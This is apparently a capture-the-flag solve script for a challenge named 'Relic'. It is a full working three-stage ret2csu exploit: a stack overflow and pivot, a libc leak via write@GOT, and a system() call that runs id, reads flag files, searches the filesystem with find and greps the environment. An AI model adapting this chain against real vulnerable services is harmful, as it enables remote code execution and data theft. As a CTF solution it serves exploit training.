#!/usr/bin/env python3
"""CSCTF Relic: three-stage ret2csu exploit.

Local:  python3 solve.py --local
Remote: python3 solve.py --host HOST --port PORT
For local mode, extract relic.tar.gz beside this script so relic,
libc.so.6, and ld-linux-x86-64.so.2 are in the same directory.
"""
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent

OFFSET_TO_RIP = 0x48
POP_CSU = 0x4012DA
CALL_CSU = 0x4012C0
RET = 0x4012E4
LEAVE_RET = 0x401218
EXIT_PLT = 0x401070
GOT_WRITE = 0x403FD8
GOT_READ = 0x403FE8
BSS = 0x404100
BSS2 = 0x404800
READ_OFFSET = 0x10E1E0
SYSTEM_OFFSET = 0x52290
p64 = lambda value: struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


class Tube:
    def __init__(self, sock):
        self.sock = sock
        self.buffer = b""

    def send(self, data):
        self.sock.sendall(data)

    def recvuntil(self, token, timeout=8):
        deadline = time.monotonic() + timeout
        while token not in self.buffer:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"waiting for {token!r}; buffered={self.buffer!r}")
            self.sock.settimeout(remaining)
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed; buffered={self.buffer!r}")
            self.buffer += chunk
        end = self.buffer.index(token) + len(token)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result

    def recvn(self, count, timeout=8):
        deadline = time.monotonic() + timeout
        while len(self.buffer) < count:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"wanted {count} bytes, got {len(self.buffer)}")
            self.sock.settimeout(remaining)
            chunk = self.sock.recv(max(4096, count - len(self.buffer)))
            if not chunk:
                raise EOFError(f"connection closed after {len(self.buffer)} of {count} bytes")
            self.buffer += chunk
        result, self.buffer = self.buffer[:count], self.buffer[count:]
        return result

    def recvall_idle(self, idle=1.0, total=8.0):
        output, self.buffer = self.buffer, b""
        deadline = time.monotonic() + total
        while time.monotonic() < deadline:
            self.sock.settimeout(min(idle, deadline - time.monotonic()))
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            output += chunk
        return output


def local_connection():
    loader = HERE / "ld-linux-x86-64.so.2"
    binary = HERE / "relic"
    if not loader.exists() or not binary.exists() or not (HERE / "libc.so.6").exists():
        raise FileNotFoundError("Extract relic.tar.gz beside solve.py first")
    parent, child = socket.socketpair()
    process = subprocess.Popen(
        [str(loader), "--library-path", str(HERE), str(binary)],
        stdin=child.fileno(), stdout=child.fileno(), stderr=child.fileno(),
        cwd=str(HERE), close_fds=True,
    )
    child.close()
    return parent, process


def build_stage1():
    # Overflow 0x48 bytes to RIP, call read(0, BSS, 0x400), then pivot to BSS.
    chain = [
        POP_CSU,
        0, 1, 0, BSS, 0x400, GOT_READ,
        CALL_CSU,
        0, 0, BSS, 0, 0, 0, 0, LEAVE_RET,
    ]
    payload = b"A" * OFFSET_TO_RIP + b"".join(map(p64, chain))
    if len(payload) > 0x120:
        raise ValueError("stage 1 exceeds the vulnerable read size")
    return payload.ljust(0x120, b"P")


def build_stage2():
    # Leak read@GOT through write(1, GOT_READ, 8), then read stage 3 into BSS2.
    chain = [
        0, POP_CSU,
        0, 1, 1, GOT_READ, 8, GOT_WRITE,
        CALL_CSU,
    ]
    chain += [0] * 7
    chain += [
        POP_CSU,
        0, 1, 0, BSS2, 0x400, GOT_READ,
        CALL_CSU,
    ]
    chain += [0, 0, BSS2, 0, 0, 0, 0, LEAVE_RET]
    return b"".join(map(p64, chain))


def build_stage3(system_addr):
    command = (
        b"echo RELIC_ROP_SUCCESS; id; pwd; "
        b"cat /flag /flag.txt ./flag ./flag.txt /home/ctf/flag "
        b"/home/ctf/flag.txt /app/flag 2>/dev/null; "
        b"find / -maxdepth 4 -type f -name 'flag*' "
        b"-exec cat {} \\; 2>/dev/null; env | grep -i flag; exit"
    ) + b"\x00"
    command_addr = BSS2 + 0xA0
    function_pointer_addr = BSS2 + 0x98
    chain = [
        0, RET, POP_CSU,
        0, 1, command_addr, 0, 0, function_pointer_addr,
        CALL_CSU,
    ]
    chain += [0] * 7
    chain += [EXIT_PLT]
    payload = bytearray(0xA0 + len(command))
    payload[:len(chain) * 8] = b"".join(map(p64, chain))
    payload[0x98:0xA0] = p64(system_addr)
    payload[0xA0:0xA0 + len(command)] = command
    return bytes(payload)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--local", action="store_true", help="run the bundled local challenge")
    parser.add_argument("--host", help="authorized challenge host")
    parser.add_argument("--port", type=int, help="authorized challenge port")
    args = parser.parse_args()
    if not args.local and (not args.host or args.port is None):
        parser.error("supply --local or both --host and --port")

    process = None
    if args.local:
        sock, process = local_connection()
        print("[+] Started bundled Relic locally")
    else:
        print(f"[+] Connecting to {args.host}:{args.port}")
        sock = socket.create_connection((args.host, args.port), timeout=10)
    tube = Tube(sock)
    try:
        banner = tube.recvuntil(b"Leave something in the vault: ")
        print(banner.decode("utf-8", "replace"), end="")

        tube.send(build_stage1())
        tube.recvuntil(b"\n")
        print("[+] Stage 1: overflow and stack pivot accepted")

        tube.send(build_stage2())
        read_addr = struct.unpack("<Q", tube.recvn(8))[0]
        libc_base = read_addr - READ_OFFSET
        system_addr = libc_base + SYSTEM_OFFSET
        print(f"[+] read@libc = {read_addr:#x}")
        print(f"[+] libc base = {libc_base:#x}")
        print(f"[+] system    = {system_addr:#x}")

        tube.send(build_stage3(system_addr))
        output = tube.recvall_idle(idle=1.0, total=8.0)
        text = output.decode("utf-8", "replace")
        print(text, end="" if text.endswith("\n") else "\n")
        if "RELIC_ROP_SUCCESS" not in text:
            raise RuntimeError("The final ret2csu/system stage was not confirmed")
        print("[+] Shell execution confirmed")
        match = re.search(r"CSCTF\{[^}\r\n]+\}", text)
        if match:
            print("[+] Candidate flag:", match.group(0))
        else:
            print("[-] No flag was returned by this target session")
    finally:
        sock.close()
        if process:
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise
